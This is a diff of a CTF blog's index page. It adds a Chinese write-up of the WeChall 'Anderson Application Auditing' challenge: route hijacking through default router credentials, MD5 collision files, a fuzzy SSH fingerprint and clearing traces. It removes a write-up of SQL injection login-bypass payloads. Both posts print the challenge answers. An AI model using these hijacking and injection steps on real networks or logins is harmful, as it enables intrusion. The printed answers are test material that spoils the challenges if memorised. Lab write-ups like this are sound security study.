@@ -235,7 +235,7 @@ p.spoiler {
   <nav class="site-state">
       <div class="site-state-item site-state-posts">
         <a href="/archives/">
-          <span class="site-state-item-count">353</span>
+          <span class="site-state-item-count">354</span>
           <span class="site-state-item-name">posts</span>
         </a>
       </div>
@@ -246,7 +246,7 @@ p.spoiler {
       </div>
       <div class="site-state-item site-state-tags">
           <a href="/tags/">
-        <span class="site-state-item-count">219</span>
+        <span class="site-state-item-count">221</span>
         <span class="site-state-item-name">tags</span></a>
       </div>
   </nav>
@@ -376,6 +376,140 @@ p.spoiler {
     </div>
 
     <div class="main-inner index posts-expand">
+
+    
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
+    <link itemprop="mainEntityOfPage" href="https://vkkkv.github.io/wp/WeChall/wechall-anderson-application-auditing/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.png">
+      <meta itemprop="name" content="vkkkv">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Hello Navi">
+      <meta itemprop="description" content="A blog about CTF writeups, Linux, Mathematics, Technology, and personal thoughts.">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content=" | Hello Navi">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          <a href="/wp/WeChall/wechall-anderson-application-auditing/" class="post-title-link" itemprop="url">WeChall - Anderson Application Auditing (AAA)</a>
+        </h2>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">Posted on</span>
+      
+
+      <time title="Created: 2026-07-08 19:18:57 / Modified: 19:51:56" itemprop="dateCreated datePublished" datetime="2026-07-08T19:18:57+08:00">2026-07-08</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">In</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/ctf/" itemprop="url" rel="index"><span itemprop="name">ctf</span></a>
+        </span>
+    </span>
+
+  
+  
+  <span class="post-meta-item">
+    
+      <span class="post-meta-item-icon">
+        <i class="far fa-comment"></i>
+      </span>
+      <span class="post-meta-item-text">Disqus: </span>
+    
+    <a title="disqus" href="/wp/WeChall/wechall-anderson-application-auditing/#disqus_thread" itemprop="discussionUrl">
+      <span class="post-comments-count disqus-comment-count" data-disqus-identifier="wp/WeChall/wechall-anderson-application-auditing/" itemprop="commentCount"></span>
+    </a>
+  </span>
+  
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+          <h3 id="challenge">Challenge</h3>
+<p>Anderson Application Auditing 是 storyline/realistic
+多阶段挑战。背景：VSA 委托 SoftMicro 开发程序、Anderson 负责审计，你作为
+hacker 需要劫持 Anderson 与 SoftMicro/VSA
+之间的通信，替换被审计程序为恶意版本。过程中收集六段 secret
+code，拼接后提交。</p>
+<p>已知信息：</p>
+<ul>
+<li>SoftMicro 网段：<code>207.46.197.0</code></li>
+<li>你的 public IP：<code>17.149.160.49</code></li>
+<li>Anderson 主页：<code>index2.html</code></li>
+</ul>
+<h3 id="solution">Solution</h3>
+<h4 id="第一阶段路由劫持">第一阶段：路由劫持</h4>
+<p>阅读 <code>tech_spec.txt</code>
+获取网络文档，其中泄露了路由器管理凭据 <code>admin/admin</code>。</p>
+<p>访问
+<code>router_config.html</code>，用默认凭据登录。添加两条路由，将
+SoftMicro 和 Anderson 相关网段的流量劫持到你的 public IP：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">route add -net 207.46.197.0 netmask 255.255.255.0 gw 17.149.160.49</span><br><span class="line">route add -net 12.110.110.0 netmask 255.255.255.0 gw 17.149.160.49</span><br></pre></td></tr></table></figure>
+<p>成功添加后获得第一段 secret code。</p>
+<h4 id="第二阶段md5-碰撞">第二阶段：MD5 碰撞</h4>
+<p>题目模拟 Anderson 通过 PKI/MD5 验证程序完整性。需要上传两个内容不同但
+MD5 相同的文件来替换合法程序。</p>
+<p>页面提示使用 MD5 碰撞工具。用 fastcoll（Linux）生成碰撞文件：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="string">&quot;prefix&quot;</span> &gt; good.txt</span><br><span class="line">fastcoll -p good.txt -o evil1.txt evil2.txt</span><br></pre></td></tr></table></figure>
+<p>上传两个碰撞文件后获得第二段 secret code。</p>
+<h4 id="第三阶段ssh-fingerprint">第三阶段：SSH Fingerprint</h4>
+<p>服务只检查 SSH fingerprint 的前 2 字节和最后 1 字节。需要用 fuzzy
+fingerprint 工具生成满足部分匹配的密钥对。</p>
+<p>使用 THC-FuzzyFingerprint（<code>ffp</code>）工具：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 目标 fingerprint（16 进制，只关心前 2 和后 1 nibble）</span></span><br><span class="line">ffp -f md5 -k 4 -l 1000 -t 03:88:9c:36:41:50:39:15:04:95:89:a4:15:84:fb:b3 -e -d /tmp</span><br></pre></td></tr></table></figure>
+<p>生成后上传 <code>ssh-rsa00.pub</code>（公钥）和
+<code>ssh-rsa00</code>（私钥），通过验证后获得第三、四段 secret
+code。</p>
+<h4 id="第四阶段清理痕迹">第四阶段：清理痕迹</h4>
+<p>回到 <code>router_config.html</code>，删除之前添加的路由：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">route del -net 207.46.197.0 netmask 255.255.255.0 gw 17.149.160.49</span><br><span class="line">route del -net 12.110.110.0 netmask 255.255.255.0 gw 17.149.160.49</span><br></pre></td></tr></table></figure>
+<p>完成后获得第五、六段 secret code。</p>
+<h4 id="最终提交">最终提交</h4>
+<p>六段 secret code 按顺序拼接：</p>
+<span class="spoiler" onclick="this.classList.toggle('spoiler')"><span class="spoiler-blur ">routeevilmd5mitmfingerprintgameover</span></span>
+
+      
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+</div>
+
+
+
 
     
 
@@ -1619,121 +1753,6 @@ returns more than 1 row" → 页面出现
 <code>s.get(URL, params={'reset': 'me'})</code> 是错误写法——正确做法是
 <strong>不 reset</strong>，成功提交后服务器自动发新 hash</li>
 </ul>
-
-      
-    </div>
-
-    
-    
-    
-
-    <footer class="post-footer">
-        <div class="post-eof"></div>
-      
-    </footer>
-  </article>
-</div>
-
-
-
-
-    
-
-
-<div class="post-block">
-  
-  
-
-  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
-    <link itemprop="mainEntityOfPage" href="https://vkkkv.github.io/wp/WeChall/wechall-cgx-10-sql-injection/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.png">
-      <meta itemprop="name" content="vkkkv">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Hello Navi">
-      <meta itemprop="description" content="A blog about CTF writeups, Linux, Mathematics, Technology, and personal thoughts.">
-    </span>
-
-    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
-      <meta itemprop="name" content=" | Hello Navi">
-      <meta itemprop="description" content="">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          <a href="/wp/WeChall/wechall-cgx-10-sql-injection/" class="post-title-link" itemprop="url">WeChall - CGX#10 - SQL Injection</a>
-        </h2>
-
-        <div class="post-meta-container">
-          <div class="post-meta">
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-calendar"></i>
-      </span>
-      <span class="post-meta-item-text">Posted on</span>
-      
-
-      <time title="Created: 2026-06-20 14:54:47 / Modified: 14:54:52" itemprop="dateCreated datePublished" datetime="2026-06-20T14:54:47+08:00">2026-06-20</time>
-    </span>
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-folder"></i>
-      </span>
-      <span class="post-meta-item-text">In</span>
-        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-          <a href="/categories/ctf/" itemprop="url" rel="index"><span itemprop="name">ctf</span></a>
-        </span>
-    </span>
-
-  
-  
-  <span class="post-meta-item">
-    
-      <span class="post-meta-item-icon">
-        <i class="far fa-comment"></i>
-      </span>
-      <span class="post-meta-item-text">Disqus: </span>
-    
-    <a title="disqus" href="/wp/WeChall/wechall-cgx-10-sql-injection/#disqus_thread" itemprop="discussionUrl">
-      <span class="post-comments-count disqus-comment-count" data-disqus-identifier="wp/WeChall/wechall-cgx-10-sql-injection/" itemprop="commentCount"></span>
-    </a>
-  </span>
-  
-  
-</div>
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-          <h3 id="challenge">Challenge</h3>
-<p>CGX#10 是 Codegeex 系列的 SQL 注入训练挑战，包含两个登录表单（mask1 /
-mask2），需要分别注入获取 secret word。挑战描述为 "training
-challenge"，属于 Training / Exploit / MySQL 分类。</p>
-<h3 id="solution">Solution</h3>
-<h4 id="problem-1">Problem #1</h4>
-<p>源码位于 <code>mask1.code</code>：</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$user</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line"><span class="variable">$pass</span> = <span class="title function_ invoke__">md5</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>]);</span><br><span class="line"><span class="variable">$query</span> = <span class="string">&quot;SELECT * FROM users WHERE username = &#x27;<span class="subst">$user</span>&#x27; AND password = &#x27;<span class="subst">$pass</span>&#x27;&quot;</span>;</span><br><span class="line"><span class="variable">$result</span> = <span class="title function_ invoke__">mysqli_query</span>(<span class="variable">$link</span>, <span class="variable">$query</span>);</span><br><span class="line"><span class="variable">$userdata</span> = <span class="title function_ invoke__">mysqli_fetch_assoc</span>(<span class="variable">$result</span>);</span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$userdata</span>) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;Welcome back, <span class="subst">$user</span>, Your first secret word is \&quot;<span class="subst">&#123;$solution&#125;</span>\&quot;&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<p>单引号字符串拼接，无任何过滤。password 用 MD5
-处理但不影响注入——可以在 username 中闭合引号并注释掉 password 检查：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">username = admin&#x27; --</span><br><span class="line">password = anything</span><br></pre></td></tr></table></figure>
-<p><code>--</code> 后必须有空格。登录成功后页面显示第一个 secret
-word：<strong>silverbullet</strong>。</p>
-<h4 id="problem-2">Problem #2</h4>
-<p><code>mask2.code</code> 只有一行有效代码：</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">require</span> <span class="string">&#x27;solution2.php&#x27;</span>;</span><br></pre></td></tr></table></figure>
-<p>源码不可见，但测试发现改用<strong>双引号</strong>作为字符串定界符：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">username = admin&quot; OR &quot;1&quot;=&quot;1&quot; --</span><br><span class="line">password = anything</span><br></pre></td></tr></table></figure>
-<p>利用双引号闭合方式绕过。登录后显示第二个 secret
-word：<strong>firestarter</strong>。</p>
-<h4 id="答案">答案</h4>
-<p>两个 secret word 拼接后提交：</p>
-<span class="spoiler" onclick="this.classList.toggle('spoiler')"><span class="spoiler-blur ">silverbulletfirestarter</span></span>
 
       
     </div>
